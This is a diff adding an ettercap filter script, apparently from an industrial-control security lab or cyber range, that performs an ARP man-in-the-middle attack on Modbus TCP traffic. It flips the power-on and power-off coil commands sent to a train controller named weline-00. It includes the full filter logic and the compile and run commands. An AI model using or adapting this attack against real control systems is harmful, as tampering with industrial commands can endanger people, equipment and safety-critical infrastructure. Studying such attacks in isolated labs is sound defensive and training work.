@@ -1,0 +1,33 @@
+#-----------------------------------------------------------------------------
+# Name:        arp_mitm.filter
+#
+# Purpose:     This filter is used to do the arp man in the middle attack to 
+#              reverse the Modbus control signal of train weline-00.
+#
+# Author:      Yuancheng Liu
+#
+# Version:     v_0.1
+# Created:     2023/10/02
+# Copyright:   
+# License:     
+#-----------------------------------------------------------------------------
+
+if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '10.107.105.7') {
+
+    if (search(DATA.data ,"\x00\x06\x01\x05\x00\x00\x00\x00")) {
+        replace("\x00\x06\x01\x05\x00\x00\x00\x00", "\x00\x06\x01\x05\x00\x00\xff\x00");
+        msg("Reverse train weline-00 power off signal.\n");
+        exit();
+    }
+
+    if (search(DATA.data ,"\x00\x06\x01\x05\x00\x00\xff\x00")) {
+        replace("\x00\x06\x01\x05\x00\x00\xff\x00", "\x00\x06\x01\x05\x00\x00\x00\x00");
+        msg("Reverse train weline-00 power on signal.\n");
+        exit();
+    }
+}
+
+#-----------------------------------------------------------------------------
+# Filter Usage:
+# - compile : etterfilter arp_mitm.filter -o mitm.ef
+# - execute : sudo ettercap -T -q -F mitm.ef -M ARP /10.107.107.5//
